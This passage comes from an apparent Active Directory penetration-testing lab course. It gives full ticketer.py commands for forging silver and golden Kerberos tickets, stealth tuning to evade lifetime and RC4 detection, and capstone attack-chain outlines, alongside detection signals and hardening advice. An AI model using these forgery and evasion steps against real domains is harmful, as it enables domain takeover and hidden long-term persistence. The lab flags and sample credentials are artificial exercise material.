The KDC never sees the silver ticket. The target service accepts it as a normal AP-REQ because the server signature is valid. The cross-reference signal; "auth happened on the service but no 4769 was issued by the KDC for that user/service pair"; exists only if you correlate target and DC logs by user, service name, and timestamp. Microsoft Defender for Identity does some of this; bespoke SIEM rules can do more.

docs.title: Hardening Note
docs.text:
The vulnerability is the cached service-account password. Rotate it and the forgery dies; rotate it forever (gMSA) and forgery is impractical.

Silver-ticket hardening

  • Migrate every service account to a gMSA. 240-byte auto-rotated passwords make captured hashes uncrackable and obsolete every 30 days.
  • Enable KDC PAC signature validation on Tier-0 services (registry / GPO setting). Costs a round-trip per auth; defeats silver-ticket forgery.
  • Audit machine-account hash exposure: any compromise of a host = silver ticket for every service on that host.
  • Monitor target Security logs for 4624 logon type 3 events that have no corresponding 4769 on the DC within a 5-minute window.
  • Disable RC4 forest-wide so silver tickets must use AES (still feasible but increases attacker complexity).

docs.title: Record Your Findings
docs.text:
Service: cifs/svc-app01_<token>.corp.nordport.local

Forging key: NT hash of svc-app01_<token>$

Impersonated user: Administrator

Flag:

(OCR{silver_...})

docs.title: Analysis Questions
docs.text:
1. Silver tickets work because services do not validate the KDC signature on the PAC. Why does Microsoft default to no validation, and what changes when validation is on?

Reveal Answer

Default no-validation is a performance and reliability optimization: every service operation becomes a KDC round-trip if validation is on, doubling the load on DCs and adding a network dependency to every authenticated call. The Microsoft setting Validate KDC PAC Signature (registry / GPO) enables it. When on, the service computes the KDC signature using its trust relationship with the KDC and sends a validation call to the DC; if the signature does not match, the service rejects the ticket. With validation on, silver tickets fail because the attacker does not have the krbtgt key needed to forge the KDC signature. Most environments leave validation off for the performance cost. Tier-0 services (DCs themselves, certain backup software) sometimes have it on; the rest typically do not.

2. The default group SID list in ticketer.py includes 512 (Domain Admins). The service trusts that claim without verification. What is the implication for non-DA services that should restrict access to actual DA members?

Reveal Answer

Non-DA services that gate access on group membership read the membership from the PAC, which the attacker has populated with whatever groups they want. So a "Domain Admins only" share, a "Backup Operators only" backup target, or any service that checks IsInRole("Domain Admins") will accept the forged ticket as a valid DA. Silver tickets are dangerous against well-secured services for exactly that reason: the gating logic on the service trusts the ticket, not the directory. The defender controls are: (a) enforce KDC PAC signature validation as above; (b) authorize requests by querying AD directly rather than reading the PAC (slower, but accurate); (c) rotate service account passwords frequently, which invalidates outstanding silver tickets (typically gMSA's 30-day rotation does this automatically). Most environments do none of these; silver tickets remain effective.

3. Silver tickets are scoped to one service, but the same NT hash forges tickets for any SPN registered to that account. How does the practical scope of a silver ticket compare to the theoretical "one service"?

Reveal Answer

Practically: every SPN registered to the account is a forge-able service. A SQL service account with SPNs MSSQLSvc/db01:1433, MSSQLSvc/db02:1433, and MSSQLSvc/db-cluster:1433 can be silver-ticketed for any of those three. A machine account ALSO has SPNs by default: cifs/<host>, host/<host>, RestrictedKrbHost/<host>, RPCSS/<host>, WSMAN/<host>, TERMSRV/<host>. So a captured machine NT hash forges tickets for every Windows service running on that host: SMB, CIFS, WinRM, RDP, RPC. The "one service" framing is misleading; the practical scope is "everything the account can speak Kerberos for." For a machine account that is the entire Windows service surface of that host.

docs.title: Key Takeaways
docs.text:
• Silver ticket = forged TGS; signed with the service account's NT hash; presented directly to the service; KDC never involved.
  • ticketer.py -nthash <hash> -spn <service> <impersonated_user> forges in one command.
  • Default Windows services do not validate the KDC PAC signature; the forgery is accepted.
  • Practical scope is every SPN registered to the account, not "one service."
  • Defender controls: KDC PAC validation (rarely enabled), gMSA rotation, query AD directly for authz.

docs.title: Cheat Sheet Recap
docs.text:
The three operations below cover the full silver-ticket workflow. Note that no DC contact ever happens.

Goal Command Discover domain SID secretsdump.py -just-dc-user krbtgt "<dom>/<u>:<pw>" -dc-ip <dc> (SID is in output) Forge silver ticket ticketer.py -nthash '<hash>' -domain-sid '<SID>' -domain <domain> -spn '<svc>/<host>' Administrator Use the ticket export KRB5CCNAME=Administrator.ccache; smbclient //<host>/Admin$ -k -c "ls"

docs.title: Spaced Repetition
docs.text:
Card 1: ticketer.py Silver Ticket

Q: Forge a silver ticket for cifs/srv01.corp.local as Administrator using NT hash aaa... and domain SID S-1-5-21-1-2-3.

Answer 
ticketer.py \
  -nthash 'aaa...' \
  -domain-sid 'S-1-5-21-1-2-3' \
  -domain corp.local \
  -spn 'cifs/srv01.corp.local' \
  Administrator

Output: Administrator.ccache. Use with KRB5CCNAME=Administrator.ccache smbclient //srv01/Admin$ -k.

Card 2: Silver vs Golden Comparison

Q: Three differences between silver and golden tickets.

Answer
  1. Forging key: silver uses the service account's hash; golden uses krbtgt's hash. 2. Ticket type: silver is a TGS for one service; golden is a TGT usable everywhere. 3. Invalidation: silver invalidates when the service account password rotates; golden invalidates only after rotating krbtgt twice. Trade-off: silver is quieter and per-service; golden is louder and domain-wide.

Card 3: Why Forgery Works Against Default Services

Q: Default Windows services skip which PAC signature check, and what would change if it were enforced?

Answer

Services skip the KDC signature validation on the PAC by default; they only validate the server signature which they themselves can verify with their own key. Enabling KDC PAC signature validation forces the service to call the DC to verify; with validation on, silver tickets fail because the attacker has the service key but not krbtgt's. The validation costs a round-trip per authentication and is therefore disabled for performance.

Card 4: Practical Scope of a Compromised Machine Hash

Q: A captured machine account NT hash silver-tickets which services on that host?

Answer

All of them: cifs/<host> (SMB / Admin$), host/<host> (general host services), RestrictedKrbHost/<host> (constrained variant), RPCSS/<host> (RPC), WSMAN/<host> (WinRM), TERMSRV/<host> (RDP), LDAP/<host> (if the host runs LDAP). Every Windows service registers an SPN against the machine account by default; possessing the machine hash makes all of them forge-able. From silver tickets to those SPNs, local SYSTEM on the host is one S4U2self away.

Card 5: Detection of Silver Tickets

Q: Why are silver tickets so hard to detect, and what is the most practical defender control?

Answer

The KDC sees nothing (no 4769 event for a forged TGS). The service sees an inbound AP-REQ with a valid PAC; from the service's perspective the auth looks normal. The only KDC-side anomaly is the absence of a corresponding 4769 for the service ticket the service is using; detectable only with cross-referenced logs. The most practical defender control is gMSA migration: gMSA passwords rotate every 30 days and are 240 random bytes, so even a captured hash becomes useless quickly and is uncrackable in the meantime. KDC PAC validation is the strongest control but rarely enabled.

docs.title: Before You Begin
docs.text:
A golden ticket is a forged TGT. The attacker possesses krbtgt's NT hash (or AES key) and uses it to encrypt a TGT for any user, with any group memberships, with any lifetime. Every DC in the domain accepts the forged TGT as authentic because krbtgt's hash is what every DC uses to validate TGTs. The forgery is undetectable in the ticket itself: cryptographically, the TGT is valid.

The only invalidation is rotating krbtgt twice (twice because the previous and current passwords are both honored briefly). Most organizations have never rotated krbtgt. So a golden ticket forged today is often usable years later.

Exercise 5.4 gives you krbtgt's NT hash. Forge a TGT for a non-existent user named GhostAdmin with Domain Admins membership. Use it to read a flag in a share that legitimate accounts cannot reach.

Tools required: impacket-ticketer. Pre-installed on Kali.

docs.title: Scenario
docs.text:
Marcus Bell: "The krbtgt account encrypts every TGT in the domain. Possess its hash and you write your own laminated all-access pass. The only fix is to rotate krbtgt twice. Most companies have never done it once."

The flag lives at \\corp-dc01\GoldenFlags\golden_flag_<token>.txt, accessible only to Domain Admins.

Credentials:

Item Value krbtgt NT hash (per-token, dashboard; or recover via Exercise 5.2 DCSync) Domain SID (per-token, dashboard; S-1-5-21-...)

Domain: corp.nordport.local

docs.title: Your Objectives
docs.text:
• Forge a TGT for GhostAdmin (a name not in AD) with Domain Admins membership
  • Inject the TGT into your Kerberos credential cache
  • Read the per-token flag

docs.title: Golden Ticket on the Wire
docs.text:
The diagram below contrasts the legitimate AS exchange with the golden ticket flow. No AS-REQ ever fires; the TGT appears in the cache out of nowhere.

sequenceDiagram
    autonumber
    participant A as Attacker (Kali)
    participant K as KDC (corp-dc01)
    participant T as Target service<br/>(GoldenFlags share)

    Note over A,K: Legitimate flow
    rect rgb(220,235,250)
        A->>K: AS-REQ (real user)
        K-->>A: AS-REP / TGT
    end

    Note over A,K: Golden ticket flow
    A--xK: (no AS-REQ, no AS-REP)
    Note over A: ticketer.py forges TGT,<br/>signs with krbtgt key
    A->>K: TGS-REQ for cifs/dc01<br/>(forged TGT in padata)
    K-->>A: TGS-REP for Administrator<br/>(KDC accepts forged TGT as authentic)
    A->>T: AP-REQ via SMB
    T-->>A: SMB session as Administrator

docs.title: Group RIDs to Claim
docs.text:
ticketer.py accepts a comma-separated list of group RIDs to put in the PAC. The defaults cover the standard domain-wide admin set; the table below tells you when to add more.

RID Group When to include 512 Domain Admins Always 513 Domain Users Always 518 Schema Admins Schema modifications 519 Enterprise Admins Forest-level admin (multi-domain forests) 520 Group Policy Creator Owners GPO modifications 544 BUILTIN\Administrators Local admin on DC's filesystem 551 Backup Operators Bypass file ACLs via backup right

docs.title: Background: Why Golden Tickets Work
docs.text:
The KDC validates incoming TGTs by decrypting them with krbtgt's key. If the decryption succeeds and the contents are well-formed, the KDC accepts the TGT and issues TGSes for whatever services the (claimed) user requests. There is no callback to verify that the user actually exists in AD; the PAC inside the ticket is the source of truth for identity and group membership.

The attacker forges a ticket with: - A made-up username (GhostAdmin); AD never sees the name; the KDC trusts the PAC - The Administrator user ID (RID 500) for SID construction - Group SIDs for Domain Admins (RID 512), Enterprise Admins (519), Schema Admins (518), Group Policy Creator Owners (520), Domain Users (513) - A long lifetime (default ticketer.py produces 10 years; tune for stealth)

The KDC issues TGSes against the forged TGT. Every service accepts those TGSes because they are normal TGSes signed with the right service key (which the KDC has). The chain is invisible to the targeted services; only the DC's KDC sees a TGT it cannot link to a real authentication event.

docs.title: Detection signals
docs.text:
Signal Why it fires TGT lifetime anomaly ticketer.py defaults to 10-year lifetime; real TGTs are 10 hours Encryption-type mismatch If you forge with NT hash (RC4), services expecting AES log the etype mismatch 4769 with no preceding 4768 TGS request without a corresponding TGT issuance RID 500 from non-Administrator name GhostAdmin claims RID 500 (Administrator), but the original Administrator's history shows different login times

The most reliable defender control is the lifetime check: a TGT with a 10-year lifetime is impossible in normal operation. ticketer.py's -duration flag tunes it; a 10-hour TGT looks like every other ticket but expires fast.

docs.title: Why "rotate krbtgt twice"
docs.text: Microsoft's krbtgt rotation cmdlet (New-KrbtgtKeys.ps1 from the krbtgt rotation script) honors the previous password for backwards compatibility; DCs accept tickets encrypted with the previous OR current key briefly to handle in-flight authentication. So one rotation invalidates tickets encrypted with the older-old key but not the previous-old key. Two rotations, separated by a wait period (default 24 hours) for the first rotation to propagate, fully retire all old keys.

docs.title: A note on AES
docs.text: Modern domains use AES for krbtgt by default. Forging with the NT hash (-nthash) produces an RC4-encrypted TGT, which works but stands out in logs. Forging with the AES key (-aesKey) produces an AES-encrypted TGT that blends in. Use the AES key when available.

docs.title: ticketer.py for golden ticket
docs.text:
ticketer.py \
  -nthash <KRBTGT_NT_HASH> \
  -domain-sid <DOMAIN_SID> \
  -domain corp.nordport.local \
  -user-id 500 \
  -groups 513,512,520,518,519 \
  GhostAdmin
Flag Effect -nthash krbtgt's NT hash (the forging key) -domain-sid the domain SID -domain realm name -user-id 500 Administrator's RID (the ticket SID will be <DomainSID>-500) -groups comma-separated list of group RIDs to claim - positional argument: the impersonated username (any string; AD never sees it)

Output: GhostAdmin.ccache.

For AES-key variant:

ticketer.py \
  -aesKey <KRBTGT_AES256_KEY> \
  -domain-sid <DOMAIN_SID> \
  -domain corp.nordport.local \
  -user-id 500 \
  -groups 513,512,520,518,519 \
  GhostAdmin

docs.title: Important groups
docs.text:
RID Group When to include 512 Domain Admins Always for max impact 513 Domain Users Always (every user is in this) 518 Schema Admins Schema modifications 519 Enterprise Admins Forest-level admin (multi-domain forests) 520 Group Policy Creator Owners GPO modifications 544 BUILTIN\Administrators Local admin on DC's filesystem

ticketer.py defaults to 513,512,520,518,519, which covers the standard domain-wide admin set.

docs.title: Using the forged TGT
docs.text:
export KRB5CCNAME=GhostAdmin.ccache
klist
smbclient //corp-dc01/GoldenFlags -k

docs.title: Step 1: Gather Inputs
docs.text:
Three inputs forge the ticket: krbtgt's NT hash (the forging key), the domain SID (so the impersonated user's SID has the correct prefix), and the realm name. The username string can be anything since AD is never consulted to validate it.

From the dashboard:

KRBTGT NT hash:   <32 hex chars>
Domain SID:       S-1-5-21-XXXX-YYYY-ZZZZ

If the dashboard does not have the krbtgt hash, recover it via Exercise 5.2 (DCSync). The same domain SID is in the secretsdump output line for any user (strip the trailing -RID).

docs.title: Step 2: Forge the Golden Ticket
docs.text:
ticketer.py builds a TGT structure: PAC with the impersonated user's SID and group SIDs, server signature with krbtgt's hash, KDC signature with the same key, and a long lifetime. The result is a credential cache file ready to use.

Kali - ticketer.py golden ticket

cd ~/work && mkdir -p adpt-5-04 && cd adpt-5-04
ticketer.py \
  -nthash '<KRBTGT_NT_HASH>' \
  -domain-sid 'S-1-5-21-XXXX-YYYY-ZZZZ' \
  -domain corp.nordport.local \
  -user-id 500 \
  -groups 513,512,520,518,519 \
  GhostAdmin
ls -la GhostAdmin.ccache
Flag Effect -nthash <hash> krbtgt's NT hash. Use -aesKey for AES-only environments (stealthier). -domain-sid <SID> Domain SID prefix (no trailing RID). -domain <realm> Realm name. -user-id 500 RID for the impersonated user. 500 = Administrator. -groups 513,512,520,518,519 Group RIDs to claim in the PAC. Default covers Domain Users + the four admin groups. GhostAdmin Positional: the username string in the ticket. Any value; AD is not consulted.

docs.title: Step 3: Inject and Use
docs.text:
The ccache loads with KRB5CCNAME. The forged TGT is now your "TGT": when smbclient needs a TGS for a service, it sends a TGS-REQ to the KDC with the forged TGT in the padata. The KDC decrypts the TGT with krbtgt's key (matches), reads the PAC (says you are Administrator with Domain Admins), and issues a fresh TGS for whatever service you ask for.

Kali - Use the forged TGT

export KRB5CCNAME=$(pwd)/GhostAdmin.ccache
klist

klist shows Default principal: GhostAdmin@CORP.NORDPORT.LOCAL and the krbtgt service ticket. The TGT lifetime line shows the (long) validity period; if you used the default, this reads ~10 years.

Kali - Read the protected share

smbclient "//corp-dc01.corp.nordport.local/GoldenFlags" -k \
  -c "get golden_flag_${OCR_SCOPE_TOKEN}.txt"
cat golden_flag_${OCR_SCOPE_TOKEN}.txt

Submit the OCR{...} value.

docs.title: Step 4: Confirm Persistence Property
docs.text:
For learning, note that:

  1. The user GhostAdmin does not exist in AD. Get-ADUser GhostAdmin returns nothing.
  2. If the legitimate Administrator's password were rotated right now, your ticket would still work tomorrow, next week, and ten years from now; until krbtgt is rotated twice.
  3. There is no event 4768 (AS request) for GhostAdmin on any DC, because no AS exchange happened.

Independence from any user-account password rotation is the persistence property that makes golden tickets the gold standard for long-term access.

Common gotchas

  • Default lifetime triggers detection: ticketer.py defaults to 10-year tickets; that is impossible in normal AD operation. Add -duration 10 (hours) to mimic a real TGT.
  • RC4 vs AES: -nthash produces an RC4-encrypted TGT. Modern domains often log "Kerberos encryption type downgrade" alerts on RC4. Use -aesKey with the krbtgt AES256 key (also dumped by secretsdump) for blending in.
  • Domain SID format: must be S-1-5-21-X-Y-Z (4 segments after S-1-5-21). A 3-segment value is the BUILTIN SID and produces a ticket no service trusts.
  • Cross-realm tickets: golden tickets only forge tickets within the krbtgt's domain. To forge a child-domain or trust-relationship ticket, see inter-realm golden tickets and forest-trust forgery (a separate technique).
  • Time skew: Kerberos rejects tickets more than 5 minutes off. chronyc tracking should show your Kali within seconds of the DC.
  • DC accepts but service rejects: if a target service has KDC PAC validation enabled (rare), it will detect the forgery. Switch services or accept the noise.

docs.title: Blue Team Perspective
docs.text:
A golden ticket is cryptographically valid; the detection signal lives in metadata anomalies and missing precursor events.

Activity Event ID Field giveaway TGS-REQ from forged TGT 4769 no preceding 4768 for the same user/source Excessive ticket lifetime 4769 TGT lifetime > policy max (default ticketer.py = 10 years) Encryption-type downgrade 4769 RC4 etype on a domain that requires AES Defender for Identity "Suspected Golden Ticket usage" MDI alert

Where SOCs win against golden tickets

The cleanest detection is on TGT lifetime: any 4769 referencing a parent TGT with Ticket Lifetime > 10 hours is a forgery. SIEM rule with near-zero false positives. Defender for Identity ships this detection. The metadata anomalies (RC4 etype, no preceding 4768, mismatched name vs SID) are weaker individually but compound when correlated.

docs.title: Hardening Note
docs.text:
The golden ticket vulnerability is the cached krbtgt hash. Rotate it; monitor for use; harden detection at the KDC.

Golden ticket hardening

  • Rotate krbtgt twice every 6-12 months. Use Microsoft's published rotation script with the 24-hour wait between rotations.
  • Apply Microsoft's May 2022 PKINIT hardening (KrbtgtFullPacSignature = 2) to harden the PAC sigs.
  • Enforce AES-only Kerberos forest-wide; RC4-encrypted TGTs become anomalies.
  • Configure SIEM rule on 4769 events with abnormal TGT lifetime.
  • Treat any compromised DC as a krbtgt exposure; rotate krbtgt twice on the next maintenance window after recovery.
  • Enable Microsoft Defender for Identity for built-in golden ticket detections.

docs.title: Record Your Findings
docs.text:
Forged user: GhostAdmin

Forging key: krbtgt NT hash

Claimed groups: Domain Users, Domain Admins, GPCO, Schema Admins, Enterprise Admins

Flag:

(OCR{golden_...})

docs.title: Analysis Questions
docs.text:
1. The forged TGT claims Administrator's RID (500) but a fictional username. Why does the KDC accept the mismatch?

Reveal Answer

The KDC does not verify the username against AD when validating an incoming TGT. The TGT's PAC contains the user SID (<DomainSID>-500), which the KDC trusts as the identity claim. The username string is informational metadata; it is not cross-referenced. Services downstream (CIFS, LDAP, etc.) authorize based on the SID, not the name string. So a TGT with name=GhostAdmin, SID=S-1-5-21-...-500 is treated as Administrator wherever the SID is the gating field. The defender's response is to enforce Privileged Attribute Certificate (PAC) validation with the KDC for sensitive services; but as discussed in the Silver Ticket exercise, default Windows services skip this check.

2. ticketer.py defaults to a 10-year ticket lifetime. What is the operational reason for that, and why is it also the easiest detection signal?

Reveal Answer

The 10-year default is a stealth-versus-persistence trade-off impacket made by accident: long-lived tickets are convenient for operators who want a single ticket they can use whenever, without having to re-mint. The cost is that real TGTs in modern AD environments default to 10 hours; a 10-year TGT in the wild is impossible by accident and immediately distinctive. SIEM rules that check "TGT lifetime exceeds policy maximum" catch every default ticketer.py forgery. The operational counter is -duration <hours> to set a sane lifetime: 10 hours mimics a normal ticket. Operators who want stealth use realistic lifetimes; operators who want zero-effort persistence use the default and accept the detection risk.

3. Rotating krbtgt twice is the standard mitigation. What breaks during the rotation, and why is it operationally hard for many organizations?

Reveal Answer

Operationally, the rotation requires: (a) running the krbtgt rotation script on every DC; (b) waiting 24 hours between the first and second rotation for replication and ticket lifetime expiration; (c) accepting that during the wait, any in-flight tickets encrypted with the soon-to-be-discarded key may fail and require re-authentication. The pain points are: (1) cross-domain trusts (forest with multiple domains, or external trusts with parent organizations) need coordinated rotation; (2) some legacy applications hardcoded long Kerberos ticket lifetimes and break when older keys expire faster; (3) Azure AD Connect / Entra Connect replication uses the krbtgt account, and rotation can disrupt sync; (4) the rotation script is unsigned and many security teams refuse to run unsigned scripts on Tier-0 systems without elaborate review. Most organizations skip the rotation indefinitely, accepting the persistent-golden-ticket risk as the cost of operational stability. The reality is that most production AD environments have a krbtgt key that is years old, which means any past compromise of krbtgt yields tickets that are still valid today.

docs.title: Key Takeaways
docs.text:
• Golden ticket = forged TGT signed with krbtgt's hash; accepted by every DC.
  • ticketer.py -nthash <krbtgt> -user-id 500 -groups 513,512,520,518,519 <name> forges in one command.
  • The ticket persists until krbtgt rotates twice; most environments have never rotated krbtgt.
  • Detection: 10-year ticket lifetime (default) and TGS without preceding TGT issuance.
  • Use -duration 10 (hours) and -aesKey (instead of -nthash) for stealth.

docs.title: Cheat Sheet Recap
docs.text:
The four operations below cover stealth-tuned and default golden ticket forgery. Use AES + 10h for any environment with mature monitoring.

Goal Command Loud (RC4, 10-year default) ticketer.py -nthash '<krbtgt-NT>' -domain-sid '<SID>' -domain <domain> -user-id 500 -groups 513,512,520,518,519 GhostAdmin Stealthy (AES, 10-hour) ticketer.py -aesKey '<krbtgt-AES256>' -domain-sid '<SID>' -domain <domain> -user-id 500 -groups 513,512,520,518,519 -duration 10 GhostAdmin Use the ticket export KRB5CCNAME=GhostAdmin.ccache; klist Read protected share smbclient //<dc>/<share> -k -c "ls"

docs.title: Spaced Repetition
docs.text:
Card 1: Golden Ticket Forging Command

Q: Forge a golden ticket for GhostAdmin with Domain Admins membership using krbtgt NT hash aaa... and domain SID S-1-5-21-1-2-3 for corp.local.

Answer 
ticketer.py \
  -nthash 'aaa...' \
  -domain-sid 'S-1-5-21-1-2-3' \
  -domain corp.local \
  -user-id 500 \
  -groups 513,512,520,518,519 \
  GhostAdmin

Output: GhostAdmin.ccache. Use with KRB5CCNAME=GhostAdmin.ccache klist.

Card 2: Golden vs Silver

Q: Two reasons golden tickets are operationally more valuable than silver tickets, and one reason silver is sometimes preferred.

Answer

Golden advantages: (1) usable against every Kerberos-aware service in the domain (silver is per-service); (2) survives service account password rotations (silver invalidates at rotation). Silver preferred when: (1) you do not have krbtgt and only the service account hash; (2) you want quieter persistence on a specific high-value service without the broad detection surface of using golden tickets domain-wide; (3) the service account password rotates rarely while you do not want to risk tipping off detection by minting golden tickets.

Card 3: krbtgt Rotation

Q: Why "twice" and how long between?

Answer

The first rotation puts a new password in place but keeps the old one valid briefly to handle in-flight tickets. The second rotation discards the previous (now-old) password entirely, invalidating any ticket encrypted with the original key. Microsoft's published guidance: 24 hours between rotations to allow replication to complete and outstanding tickets to expire. Skipping the wait can cause widespread authentication failures.

Card 4: TGT Lifetime Detection

Q: Why is a 10-year TGT the easiest golden-ticket detection signal, and what is the operator's stealth counter?

Answer

Real TGTs default to 10 hours per AD policy. A 10-year TGT in the wild is impossible by accident; SIEM rules that check ticket lifetime against policy maximum catch every ticketer.py forgery using defaults. Operator stealth counter: -duration 10 (hours) on the ticketer.py command, producing a normal-looking ticket. Re-mint as needed. Long lifetimes are convenience, not requirement.

Card 5: Why GhostAdmin Works

Q: A golden ticket can claim a username that does not exist in AD. Why?

Answer

The KDC validates incoming TGTs cryptographically (krbtgt key) and trusts the PAC for identity and group claims; it does NOT cross-check the username against AD. Services downstream authorize based on the SID in the PAC, not the name string. So GhostAdmin@corp.local with SID <DomainSID>-500 is treated as Administrator wherever Administrator's SID is the gating field. The mismatch is invisible to default services; only the most paranoid SIEM rules cross-reference TGT name strings against AD.

docs.title: Before You Begin
docs.text:
Capstone 6.1 is a black-box engagement. You start with VPN access to corp.nordport.local and no credentials. There are three flags at three privilege tiers; reach Domain Admin to collect all three. The exercise is open-ended: there is no walkthrough. You chose the techniques from the Levels 2-4 catalog. Multiple paths work.

The deliverable is the final flag plus a written attack-chain narrative documenting each step. Treat this like a real engagement.

Tools required: the entire Kali Active Directory toolkit. Pre-installed.

docs.title: Scenario
docs.text:
Priya Ramanathan, Nordport's CISO, emails:

"We have approved a one-week internal red team engagement against corp.nordport.local. Black-box. Start with VPN access, no credentials. I want full Domain Admin, three artifacts proving each privilege tier reached, and a written narrative I can hand to the audit committee.

Treat this like the auditor will see your work. Document every step. We will compare your chain against our internal expectations and against what BloodHound would have predicted."

Tiers:

Tier What proves it File location Tier 2 (any user) Tier 2 flag \\file01\Public\tier2_flag_<token>.txt Tier 1 (server admin / DBA) Tier 1 flag \\mssql01\C$\tier1_flag_<token>.txt Tier 0 (Domain Admin) Tier 0 flag (= final flag) \\corp-dc01\C$\tier0_flag_<token>.txt

Time budget: 4 to 6 hours across multiple sittings.

Domain: corp.nordport.local

docs.title: Phase 0: Engagement Setup (target: ~10 minutes)
docs.text:
Before any active probing, set yourself up so you can write the report without scrambling at the end.

Kali - Engagement scaffolding

mkdir -p ~/work/adpt-capstone-1/{recon,foothold,server,da,evidence}
cd ~/work/adpt-capstone-1
echo "$(date -u +%Y-%m-%dT%H:%M:%SZ) -- engagement start" >> evidence/timeline.txt
ip -4 -o addr show | tee evidence/kali-interfaces.txt
echo "OCR_SCOPE_TOKEN=${OCR_SCOPE_TOKEN}" | tee -a evidence/scope.txt
Token Effect mkdir -p ~/work/adpt-capstone-1/{...} Create per-phase artifact directories. evidence/timeline.txt Start the chain-of-custody clock. Every phase boundary appends to this file. tee Print and save in one go. Capture interfaces and scope token for the report.

The five subdirectories mirror the report structure. Drop pcaps, cred lists, BloodHound zips, ccaches, and screenshots into the right one as you produce them. The evidence/timeline.txt file becomes the skeleton of your narrative.

docs.title: Phase 1: Recon and Foothold (target: ~60 minutes)
docs.text:
The goal is any authenticated domain user credential. Three reasonable paths:

  1. LLMNR/NBT-NS poisoning on the workstation segment. The workstation segment has simulated user activity that performs mistyped lookups. Run Responder.
  2. ASREPRoast; if anonymous LDAP is enabled, enumerate users with DONT_REQ_PREAUTH; otherwise need authenticated LDAP first.
  3. Password spray; requires a user list, which means anonymous LDAP or LLMNR-captured credential first.

Cracked credential -> Tier 2 flag at \\file01\Public\tier2_flag_<token>.txt (readable by any Domain User).

docs.title: Phase 2: Server-Tier Escalation (target: ~90 minutes)
docs.text:
From a foothold credential, escalate to a server-admin or DBA account.

  1. Kerberoast the SQL service account on mssql01. The SQL account has SQL sysadmin role and can xp_cmdshell to local SYSTEM on mssql01.
  2. GenericAll / WriteDACL; BloodHound the domain from your foothold and look for ACL paths to a DBA group or directly to a privileged user.
  3. LAPS read; if j.chen (or your foothold) has LAPS read on mssql01, you have local admin directly.

Tier 1 flag at \\mssql01\C$\tier1_flag_<token>.txt (readable by local Administrators on mssql01).

docs.title: Phase 3: Domain Admin (target: ~120 minutes)
docs.text:
From server-admin/DBA, reach DA.

  1. xp_cmdshell on MSSQL -> local SYSTEM -> dump LSASS for cached domain admin credentials.
  2. ADCS ESC1 / ESC8 -> Administrator cert -> PKINIT -> krbtgt via DCSync -> golden ticket.
  3. Constrained delegation / RBCD -> impersonate Administrator -> read DC C$.

Tier 0 flag at \\corp-dc01\C$\tier0_flag_<token>.txt is the final flag, in the form OCR{...}. Read the file and submit its contents verbatim.

docs.title: Hints (Use Sparingly)
docs.text:
The lab unlocks hints at 60, 180, and 300 minutes. Use them only if you are stuck. Real engagements do not have hint timers.

Common pitfalls in capstone runs

  • Skipping Phase 0: trying to reconstruct a chain at the end without timestamped evidence wastes 30+ minutes per phase. Append to evidence/timeline.txt as you go, not at the end.
  • Dumping everything at once: full secretsdump is slower and louder than -just-dc-user krbtgt. Dump only what you need until you have time to harvest the rest.
  • Ignoring the cleanup step: if you exercised WriteDACL or RBCD, the ACE/computer account is still there. Phase 0's evidence/timeline.txt should also list cleanup actions so you can verify everything was reverted before submitting.
  • Re-running without resetting Kerberos cache: klist between phases. Stale TGTs from one phase poison authentication attempts in the next.
  • Trying every technique in parallel: pick one path per phase. The graph in BloodHound usually shows one shortest path; walk it, then go back and document alternatives in the report.

docs.title: Key Takeaways
docs.text:
• The chain matters more than any single technique.
  • BloodHound the domain from your foothold; the graph reveals paths you would not see manually.
  • Document each step as you go; reconstructing a chain from memory at the end is painful.
  • Cleanup matters: remove ACEs, group memberships, certs, and forged tickets when done.
  • The narrative is the deliverable Priya cares about. The flag proves you got there; the writeup proves you can teach the next consultant how.

  1. Which technique would you have prioritized differently in hindsight, and why?

There is no scoring API for the reflection. The point is to internalize the consultant mindset: the technical work is half; the analysis is the other half.

docs.title: Before You Begin
docs.text:
The track capstone is the bridge to GOAD. Five VMs, three domains, two trust relationships, four flags. The exercise is the explicit GOAD-Light readiness gate: students who finish this should be able to clone GOAD, drop in unaided, and immediately recognize every misconfiguration. There is no walkthrough. The deliverable is the four flags plus a multi-page engagement narrative.

You will use everything you learned in Levels 1-5: enumeration, BloodHound, ACL abuse, ADCS, delegation, ticket forging. The new techniques unique to this exercise are trust traversal: SID history injection across a parent-child trust, and external trust authentication into a partner forest.

Tools required: the entire Kali AD toolkit. Rubeus, mimikatz, impacket, bloodyAD, BloodHound, certipy. Pre-installed.

docs.title: Scenario
docs.text:
Priya: "The auditor wants to know what happens if a phishing payload lands at the corp tier. Show me. Specifically: prove you can reach Enterprise Admins in the parent forest, then prove the logistics partner trust is also compromisable from there. I want four flags, one per domain milestone."

Topology:

Forest 1: nordport.local
   Parent DC:  npdc01.nordport.local            (Enterprise Admins live here)
   Child DC:   corp-dc01.corp.nordport.local    (foothold starts here)
   Member:     mfgsql01.corp.nordport.local

Forest 2: logistics.local                       (one-way external trust:
                                                 logistics trusts nordport)
   DC:         logdc01.logistics.local
   Member:     logfs01.logistics.local

Trust relationships:
  nordport.local <-> corp.nordport.local        Parent-child (transitive, intra-forest)
  logistics.local --trusts--> nordport.local    One-way external (cross-forest)

Flags:

# Tier File Privilege required 1 Corp Tier 1 \\mfgsql01\C$\corp_tier1_<token>.txt Server admin / DBA 2 Corp Tier 0 \\corp-dc01\C$\corp_tier0_<token>.txt Domain Admin (corp) 3 Nordport EA \\npdc01\C$\np_ea_<token>.txt Enterprise Admins (parent) 4 Logistics \\logfs01\C$\log_<token>.txt Privileged user (logistics); final flag

Time budget: 8 to 12 hours across multiple sittings.

Foothold credential: j.chen / Welcome2026# in corp.nordport.local.
